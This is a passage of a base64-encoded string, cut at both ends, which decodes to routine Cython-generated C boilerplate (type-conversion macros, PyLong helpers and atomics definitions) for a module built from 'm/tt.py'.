x8XFxcbiAgICAoc2l6ZW9mKHR5cGUpID4gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAgICAgICAgICBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XFxcbiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXFxcbiAgICAgICAgICAoIWlzX3NpZ25lZCB8fCBsaWtlbHkodiA+ICh0eXBlKVBZX1NTSVpFX1RfTUlOIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01JTikpKSAgfHxcXFxuICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAgICAgICAgICAoaXNfc2lnbmVkIHx8IGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYgPT0gKHR5cGUpUFlfU1NJWkVfVF9NQVgpKSkgIClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9pc192YWxpZF9pbmRleChQeV9zc2l6ZV90IGksIFB5X3NzaXplX3QgbGltaXQpIHtcbiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0O1xufVxuI2lmIGRlZmluZWQgKF9fY3BsdXNwbHVzKSAmJiBfX2NwbHVzcGx1cyA+PSAyMDExMDNMXG4gICAgI2luY2x1ZGUgPGNzdGRsaWI+XG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBzdGQ6OmFicyh2YWx1ZSlcbiNlbGlmIFNJWkVPRl9JTlQgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKVxuI2VsaWYgU0laRU9GX0xPTkcgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgbGFicyh2YWx1ZSlcbiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKChQeV9zc2l6ZV90KV9hYnM2NCh2YWx1ZSkpXG4jZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKVxuI2VsaWYgZGVmaW5lZCAoX19HTlVDX18pXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBfX2J1aWx0aW5fbGxhYnModmFsdWUpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKCh2YWx1ZTwwKSA/IC12YWx1ZSA6IHZhbHVlKVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0Kik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqLCBQeV9zc2l6ZV90KiBsZW5ndGgpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShzLCBsKSBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZSgoY29uc3QgY2hhciopcywgbClcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nICAgICAgICBQeUJ5dGVzX0Zyb21TdHJpbmdcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU3RyaW5nKHMpICAgICAoKGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTdHJpbmcocykgICAgICgoY29uc3QgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Bc1N0cmluZyhzKSBQeUJ5dGVBcnJheV9Bc1N0cmluZyhzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTdHJpbmcocykgICAgKChjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21DU3RyaW5nKHMpICAgX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZygoY29uc3QgY2hhciopcylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbU9yZGluYWwobykgICAgICAgUHlVbmljb2RlX0Zyb21PcmRpbmFsKChpbnQpbylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0FzVW5pY29kZSAgICAgICAgICAgIFB5VW5pY29kZV9Bc1VuaWNvZGVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfTmV3UmVmKVxuICAgIHJldHVybiBQeV9OZXdSZWYob2JqKTtcbiNlbHNlXG4gICAgUHlfSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1hOZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZilcbiAgICByZXR1cm4gUHlfWE5ld1JlZihvYmopO1xuI2Vsc2VcbiAgICBQeV9YSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KTtcbiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXFxcbiAgICAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChvYmopKSA/IF9fUHl4X05ld1JlZihvYmopIDogUHlTZXF1ZW5jZV9UdXBsZShvYmopKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUxvbmdfRnJvbVNpemVfdChzaXplX3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqKTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgKFB5RmxvYXRfQ2hlY2tFeGFjdCh4KSA/IFB5RmxvYXRfQVNfRE9VQkxFKHgpIDogUHlGbG9hdF9Bc0RvdWJsZSh4KSlcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9BU19ET1VCTEUoeClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KVxuI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0Zsb2F0KHgpICgoZmxvYXQpIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkpXG4jZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0ludCh4KSAoUHlMb25nX0NoZWNrRXhhY3QoeCkgPyBfX1B5eF9OZXdSZWYoeCkgOiBQeU51bWJlcl9Mb25nKHgpKVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBN1xuICAjaWZuZGVmIF9QeUxvbmdfU0lHTl9NQVNLXG4gICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzXG4gICNlbmRpZlxuICAjaWZuZGVmIF9QeUxvbmdfTk9OX1NJWkVfQklUU1xuICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDNcbiAgI2VuZGlmXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ24oeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnICYgX1B5TG9uZ19TSUdOX01BU0spXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgICghX19QeXhfUHlMb25nX0lzTmVnKHgpKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1plcm8oeCkgIChfX1B5eF9QeUxvbmdfU2lnbih4KSAmIDEpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgIChfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICAoKFB5X3NzaXplX3QpICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnID4+IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcXFxuICAgICAgICAoKDEgLSAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX1NpZ24oeCkpICogX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpXG4gICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgICAgIFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QoKFB5TG9uZ09iamVjdCopIHgpXG4gICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpICBQeVVuc3RhYmxlX0xvbmdfQ29tcGFjdFZhbHVlKChQeUxvbmdPYmplY3QqKSB4KVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPCAoMiA8PCBfUHlMb25nX05PTl9TSVpFX0JJVFMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZW5kaWZcbiAgdHlwZWRlZiBQeV9zc2l6ZV90ICBfX1B5eF9jb21wYWN0X3B5bG9uZztcbiAgdHlwZWRlZiBzaXplX3QgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZztcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOZWcoeCkgIChQeV9TSVpFKHgpIDwgMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgIChQeV9TSVpFKHgpID49IDApXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNQb3MoeCkgIChQeV9TSVpFKHgpID4gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgICgoUHlfU0laRSh4KSA9PSAwKSA/IDAgOiBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkgIFB5X1NJWkUoeClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAoUHlfU0laRSh4KSA9PSAwIHx8IFB5X1NJWkUoeCkgPT0gMSB8fCBQeV9TSVpFKHgpID09IC0xKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcXFxuICAgICAgICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAoc2RpZ2l0KSAwIDogKChQeV9TSVpFKHgpIDwgMCkgPyAtKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdIDogKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKSlcbiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nO1xuICB0eXBlZGVmIGRpZ2l0ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7XG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUub2JfZGlnaXQpXG4gICNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0cyh4KSAgKCgoUHlMb25nT2JqZWN0Kil4KS0+b2JfZGlnaXQpXG4gICNlbmRpZlxuI2VuZGlmXG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOFxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZVVURjgoY19zdHIsIHNpemUsIE5VTEwpXG4jZWxpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZUFTQ0lJKGNfc3RyLCBzaXplLCBOVUxMKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGUoY19zdHIsIHNpemUsIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HLCBOVUxMKVxuI2VuZGlmXG5cblxuXG4jaWYgZGVmaW5lZChfX0dOVUNfXykgICAgICYmIChfX0dOVUNfXyA+IDIgfHwgKF9fR05VQ19fID09IDIgJiYgKF9fR05VQ19NSU5PUl9fID4gOTUpKSlcbiAgI2RlZmluZSBsaWtlbHkoeCkgICBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAxKVxuICAjZGVmaW5lIHVubGlrZWx5KHgpIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDApXG4jZWxzZSBcbiAgI2RlZmluZSBsaWtlbHkoeCkgICAoeClcbiAgI2RlZmluZSB1bmxpa2VseSh4KSAoeClcbiNlbmRpZiBcblxuI2lmZGVmIF9fY3BsdXNwbHVzXG4jaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMXG4jaW5jbHVkZSA8dHlwZV90cmFpdHM+XG4jZW5kaWZcbnRlbXBsYXRlIDx0eXBlbmFtZSBUPlxuc3RhdGljIHZvaWQgX19QeXhfcHJldGVuZF90b19pbml0aWFsaXplKFQqIHB0cikge1xuI2lmIF9fY3BsdXNwbHVzID4gMjAxMTAzTFxuICAgIGlmICgoc3RkOjppc190cml2aWFsbHlfZGVmYXVsdF9jb25zdHJ1Y3RpYmxlPFQ+Ojp2YWx1ZSkpXG4jZW5kaWZcbiAgICAgICAgKnB0ciA9IFQoKTtcbiAgICAodm9pZClwdHI7XG59XG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUodm9pZCogcHRyKSB7ICh2b2lkKXB0cjsgfVxuI2VuZGlmXG5cblxuI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9tID0gTlVMTDtcbiNlbmRpZlxuc3RhdGljIGludCBfX3B5eF9saW5lbm87XG5zdGF0aWMgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9jZmlsZW5tID0gX19GSUxFX187XG5zdGF0aWMgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWU7XG5cblxuXG5zdGF0aWMgY29uc3QgY2hhciogY29uc3QgX19weXhfZltdID0ge1xuICAibS90dC5weSIsXG59O1xuXG5cbiNpbmNsdWRlIDxweXRocmVhZC5oPlxuI2lmbmRlZiBDWVRIT05fQVRPTUlDU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FUT01JQ1MgMVxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0NZVEhPTl9BVE9NSUNTX0VOQUJMRUQoKSBDWVRIT05fQVRPTUlDU1xuI2RlZmluZSBfX1BZWF9HRVRfQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcoKSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgaW50XG4jZGVmaW5lIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBpbnRcbiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgICAgICAoX19TVERDX1ZFUlNJT05fXyA+PSAyMDExMTJMKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSlcbiAgICAjaW5jbHVkZSA8c3RkYXRvbWljLmg+XG4jZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFxcXG4gICAgICAgICAgICAgICAgICAgIChfX2NwbHVzcGx1cyA+PSAyMDExMDNMKSB8fFxcXG4gICAgICAgICAgICAgICAgICAgIChkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNzAwKSkpXG4gICAgI2luY2x1ZGUgPGF0b21pYz5cbiNlbmRpZlxuI2lmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fU1REQ19WRVJTSU9OX18pICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgQVRPTUlDX0lOVF9MT0NLX0ZSRUUgPT0gMilcbiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgYXRvbWljX2ludFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIGF0b21pY191aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSB1aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9yZWxheGVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfc3ViX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgYXRvbWljX2ZldGNoX3N1Yih2YWx1ZSwgYXJnKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKSBhdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIGF0b21pY19sb2FkKHZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX3JlbGF4ZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX2FjcXVpcmUodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfYWNxdWlyZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9jbXBfZXhjaGFuZ2UodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKSBhdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKVxuICAgICNpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT01JQ1MpICYmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpXG4gICAgI2VsaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKVxuICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQ